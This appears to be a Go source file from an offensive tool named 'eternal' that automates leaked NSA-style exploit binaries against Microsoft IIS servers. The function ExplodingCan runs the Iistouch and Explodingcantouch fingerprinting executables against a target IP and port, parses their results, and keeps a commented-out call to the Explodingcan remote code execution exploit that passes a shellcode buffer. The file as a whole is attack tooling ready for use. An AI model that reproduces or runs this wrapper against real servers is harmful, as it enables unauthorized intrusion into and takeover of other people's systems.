package exploits

import (
	"eternal/conf"
	"eternal/metatdatas"
	"eternal/utils"
	"fmt"
	"os/exec"
	"path/filepath"
)

func ExplodingCan() {
	filename := filepath.Join(metatdatas.MetaData.LogDir, metatdatas.MetaData.ProjectName, utils.CreateXmlFileName("Iistouch"))
	metatdatas.MetaData.SetIisPort()
	metatdatas.MetaData.SetEnableSSL()
	metatdatas.MetaData.SetHostString()
	cmd := exec.Command(conf.Touches+"Iistouch-1.2.2.exe", "--InConfig", conf.Touches+"Iistouch-1.2.2.0.xml", "--OutConfig", filename, "--TargetIp", metatdatas.MetaData.TargetIp, "--TargetPort", metatdatas.MetaData.IIS.Port, "--NetworkTimeout", metatdatas.MetaData.NetworkTimeout, "--EnableSSL", metatdatas.MetaData.IIS.EnableSSL, "--HostString", metatdatas.MetaData.IIS.HostString)
	utils.Execute(cmd)
	IisTouchResults := utils.ParseIisXml(filename)
	fmt.Println(IisTouchResults)
	filename = filepath.Join(metatdatas.MetaData.LogDir, metatdatas.MetaData.ProjectName, utils.CreateXmlFileName("Iistouch"))
	cmd = exec.Command(conf.Touches+"Explodingcantouch-1.2.1.exe", "--InConfig", conf.Touches+"Explodingcantouch-1.2.1.0.xml", "--OutConfig", filename, "--TargetIp", metatdatas.MetaData.TargetIp, "--TargetPort", metatdatas.MetaData.IIS.Port, "--NetworkTimeout", metatdatas.MetaData.NetworkTimeout, "--EnableSSL", metatdatas.MetaData.IIS.EnableSSL, "--HostString", metatdatas.MetaData.IIS.HostString, "--Delay", metatdatas.MetaData.IIS.Delay, "--maxSizeToCheck", metatdatas.MetaData.IIS.MaxSizeToCheck)
	utils.Execute(cmd)
	ExplodingcanTouchResults := utils.ParseIisXml(filename)
	fmt.Println(ExplodingcanTouchResults)
	//cmd = exec.Command(filepath.Join(conf.Exploits, "Explodingcan-2.0.2.exe"), "--InConfig", filepath.Join(conf.Exploits, "Explodingcan-2.0.2.0.xml"), "--OutConfig", filepath.Join(metatdatas.MetaData.LogDir, "logs.txt"), "--TargetIp", metatdatas.MetaData.TargetIp, "--TargetPort", metatdatas.MetaData.TargetPort, "--Target", results["Target"], "--NetworkTimeout", metatdatas.MetaData.NetworkTimeout, "--Protocol", results["Protocol"], "--PipeName", results["PipeName"], "--TargetOsArchitecture", results["TargetOsArchitecture"], "--Credentials", results["Credentials"], "--ShareName", results["ShareName"], "--ShellcodeBuffer", metatdatas.MetaData.ShellcodeBuffer)
	//utils.Execute(cmd)
	metatdatas.MetaData.ShowMetaData()
}
